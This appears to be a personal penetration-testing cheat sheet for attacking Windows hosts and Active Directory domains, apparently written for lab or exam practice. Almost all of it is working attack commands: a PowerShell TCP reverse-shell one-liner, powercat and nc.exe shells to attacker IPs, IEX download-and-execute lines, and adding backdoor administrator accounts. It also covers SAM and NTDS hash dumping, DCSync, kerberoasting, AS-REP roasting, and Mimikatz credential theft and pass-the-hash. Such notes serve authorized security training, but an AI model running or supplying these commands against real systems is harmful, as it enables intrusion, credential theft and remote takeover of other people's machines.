# Windows

#### Enumeration & Commands

```
systeminfo
schtasks /query /fo LIST /v		# scheduled task
wmic service get name,displayname,pathname,startmode    # list all the running services
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
netstat -ano    # find out what ports are open
net users
net user /domain [username]   # check domain group of the user
runas /netonly /user:[username] cmd	# run cmd as another user (even if they dont exists)
-------------------------Add user--------------------------
net user /add [username] [password]
net localgroup "Remote Desktop Users" [username] /add
net localgroup "Administrators" [username] /add
-----------------------------------------------------------
icacls "C:\Puppet"    # check path permission
icacls [FILE] /grant [USERNAME]:F   # :F for full access
whoami /priv    # Look for SeImpersonatePrivilege > Juicy Potato
whoami /groups		# UAC bypass
robocopy /b C:\Users\Administrator\Desktop\ C:\		# with SeBackupPrivilege from whoami /priv
```

#### BloodHound & Query

```
bloodhound-python -u [username] -p [password[ -d blackfield.local -ns 10.10.10.192 -c DcOnly
MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
```

#### Juicy Potato

```
potato86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.119.160 4321" -t *
```

#### SAM (Security Account Manager)

A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS)\
Passwords are LM & NTLM hashed\


```
Default file location: 
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

Dumping hashes:
samdump2 SYSTEM SAM
pwdump.py SYSTEM SAM    # For Windows 10

Format of Hashes:
[USERNAME]:[RID]:[LMHash]:[NTLMHash]:::   # RID = Relative Identifier
```

Ref: https://techgenix.com/how-cracked-windows-password-part2/

#### Active Directory & LDAP

Enum

```
nmap -n -sV --script "ldap* and not brute" [IP_ADDR]
ldapsearch -H ldap://[IP_ADDR] -x -b "dc=[DC],dc=[DC]"
ldapsearch -H ldap://[IP_ADDR] -x -b '' -s base
windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD users; -G for AD group enumerate
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request 		# ASRep Rosting
secretdumps.py htb.local/svc_user@10.10.10.161 -just-dc 	# dcsync attack, dump hashes
psexec.py htb.local/administrator@10.10.10.161 -hashes [ntlm:hash]	# login with hashes

----------Info----------
MS14-068 (For DC older than Windows Server 2012 R2)		# Ref: https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
Database of AD stored on C:\Windows\NTNDS\ntds.dit of DC
```

Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap

#### PowerShell

```
Import-Module [filename].ps1
C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
iwr http://[IP_ADDR]/[PATH] -OutFile [FILE]
IEX(New-Object Net.Webclient).downloadString('http://[IP_ADDR]/[PATH]')
Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID   # retrieve SID
nltest /domain_trusts   # show inbound/outbound trust
Get-ADUser -Filter * | select SamAccountName    # list users(name ending with $ indicate trust keys being stored)
Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName    # to retrieve user and computer accounts(ending with $)
Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *		# retrieve item in recycle bin
Set-ExecutionPolicy Unrestricted
powershell "iex(new-object net.webclient).downloadString('http://192.168.119.218/Sherlock.ps1');Find-AllVulns"
klist   # list the cached Kerberos tickets

----------Service Account Attack------------
.\enumSPN.ps1
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken-ArgumentList '[serviceprincipalname]'
Rubeus.exe kerberoast /tgtdeleg /user:[samaccountname]

---------------Reverse Shell----------------
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Metasploit

```
getsystem
load kiwi   # mimikatz
lsa_dump_sam
```

#### RPC

```
rpcdump.py [USERNAME]@[IP_ADDR]
rpcclient -U '' [IP_ADDR]
  > enumdomusers    # to get list of users after signin
  > setuserinfo [username] [level] [password]		# level: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN
```

#### Evil-WinRM

```
evil-winrm -i [IP_ADDR] -u [USERNAME] -H [HASH]   # hash retrievable from secretsdump.py machines/smb
evil-winrm -i [IP_ADDR] -u [USERNAME] -p [PASSWORD]
```

#### Tcpdump

```
tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
```

#### Mimikatz

```
privilege::debug
token::elevate
lsadump::sam
-----------------AD Enumeration-------------------
sekurlsa::logonpasswords
sekurlsa::tickets
kerberos::list
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe    # using ntlm of other user (retrieved from logonpasswords) to execute a program
```

#### Powercat

```
. .\powercat.ps1
powercat -c 10.11.0.4 -p 443 -e cmd.exe   # reverse shell
powercat -l -p 443 -e cmd.exe   # bind shell
```

#### wget equivalant / file transfer

```
certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe

--------Windows to Linux (SMB)----------
Method 1: 
On kali: impacket-smbserver [SHARE NAME] $(pwd) -smb2support -user [USER ON KALI] -password [PASSWORD ON KALI]
On windows:
$pass = convertto-securestring '[PASSWORD ON KALI]' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('[USER ON KALI]', $pass)
New-PSDrive -NAME [USER] -PSProvider FileSystem -Credential $cred -Root \\[KALI IP]\[SHARE NAME]

Method 2:
on Kali : smbserver.py test ./share
smbserver.py [share_name] [folder_path]

on Windows: copy proof.txt \\192.168.119.160\test\proof.txt
copy [file to transfer] \\[linux ip]\[share_name]\[output file name]

--------Windows to Linux (PowerCat)----------
on Linux: 
sudo nc -lnvp 443 > receiving_powercat.ps1

on Windows:
powercat -c 10.11.0.4 -p 443 -i C:\Users\admin\powercat.ps1
```

#### Kerberoasting with Rubeus

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.filter = "serviceprincipalname=*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)

{

	Foreach($prop in $obj.Properties)
	{
		$prop
	}
	Write-Host "------------------------"
}
```

1. Find interesting SPN (Service Principal Name)
2. Get its SAMaccountname
3. rubeus.exe